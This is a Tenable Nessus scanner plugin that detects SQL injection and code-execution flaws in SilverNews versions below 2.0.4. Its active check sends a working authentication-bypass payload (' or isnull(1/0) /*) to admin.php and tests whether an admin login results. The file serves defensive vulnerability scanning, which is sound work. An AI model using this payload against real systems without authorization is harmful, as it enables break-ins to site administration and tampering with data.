#
# (C) Tenable Network Security
#


if (description) {
  script_id(19398);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-2478");
  script_bugtraq_id(14466);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"18517");

  name["english"] = "SilverNews < 2.0.4 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running SilverNews, a free news script written in
PHP. 

The version of SilverNews installed on the remote host suffers from
several flaws :

  - SQL Injection Vulnerability
    The application does not sanitize user-supplied input to the 
    'username' parameter of the 'admin.php' script before using 
    it in database queries. By exploiting this flaw, an attacker
    can bypass authentication and possibly disclose or modify
    data or launch attacks against the underlying database.

  - Arbitrary PHP Code Execution Vulnerability
    The application allows administrators to edit template
    files, which may contain HTML as well as PHP code to be
    used, for example, as footers with dynamically generated
    pages. In conjunction with the SQL injection flaw noted
    above, an attacker can exploit this issue to execute
    arbitrary PHP code on the remote host within the
    context of the web server userid.

See also : 

http://www.retrogod.altervista.org/silvernews.html
http://archives.neohapsis.com/archives/bugtraq/2005-08/0045.html

Solution : 

It is believed that the issues are resolved in SilverNews 2.0.4 or
later. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in SilverNews < 2.0.4";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to call the affected script.
  req = http_get(item:string(dir, "/admin.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it looks like SilverNews...
  if (egrep(string:res, pattern:"SilverNews .+ Admin control panel")) {
    # Grab the session cookie.
    pat = "Set-Cookie: s=(.+); path=";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        sid = eregmatch(pattern:pat, string:match);
        if (sid == NULL) break;
        sid = sid[1];
        break;
      }
    }

    if (sid) {
      # Try to bypass authentication.
      postdata = raw_string(
        "act=login&",
        "username=", urlencode(str:"' or isnull(1/0) /*"), "&",
        "password=", SCRIPT_NAME
      );
      req = string(
        "POST ", dir, "/admin.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Cookie: s=", sid, "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we're now logged in.
      if (
        "admin.php?section=settings" >< res ||
        egrep(string:res, pattern:"Hello <b>.+admin\.php\?act=logout")
      ) {
        security_hole(port);
        exit(0);
      }
    }
  }
}
